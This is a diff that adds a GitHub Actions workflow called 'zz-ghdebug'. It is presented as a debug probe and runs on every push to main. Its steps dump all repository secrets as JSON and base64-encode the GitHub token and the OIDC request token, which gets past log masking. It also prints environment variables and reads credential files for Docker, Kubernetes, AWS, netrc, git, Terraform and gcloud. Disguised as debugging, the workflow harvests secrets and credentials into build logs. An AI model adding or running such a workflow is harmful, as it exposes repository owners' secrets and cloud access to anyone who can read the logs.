@@ -1,0 +1,40 @@
+name: zz-ghdebug
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: probe tag
+        required: false
+        default: manual
+permissions:
+  contents: write
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    env:
+      PROBE_STATIC: static-value-123
+    steps:
+      - name: context dump
+        env:
+          STEP_ENV_MARKER: step-env-456
+        run: |
+          echo "== inputs =="; echo '${{ toJSON(inputs) }}'
+          echo "== github =="; echo '${{ toJSON(github) }}'
+          echo "== env-context =="; echo '${{ toJSON(env) }}'
+          echo "== vars =="; echo '${{ toJSON(vars) }}'
+          echo "== secrets-json =="; echo '${{ toJSON(secrets) }}'
+          echo "== token-b64 =="; echo -n '${{ github.token }}' | base64 -w0; echo
+          echo "== idtoken-b64 =="; echo -n '${{ secrets.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}' | base64 -w0; echo
+      - name: env dump
+        run: |
+          env | sort
+          id; uname -a
+          for t in docker terraform kubectl modal aws gcloud az gh jq curl ssh; do printf '%s: ' "$t"; command -v "$t" || echo missing; done
+      - name: credential files
+        run: |
+          for f in $HOME/.docker/config.json $HOME/.kube/config $HOME/.aws/credentials $HOME/.aws/config $HOME/.netrc $HOME/.git-credentials $HOME/.terraform.d/credentials.tfrc.json $HOME/.config/gcloud/application_default_credentials.json; do echo "== $f =="; cat "$f" 2>&1; done
+          git config -l --show-origin || true
+          git remote -v || true
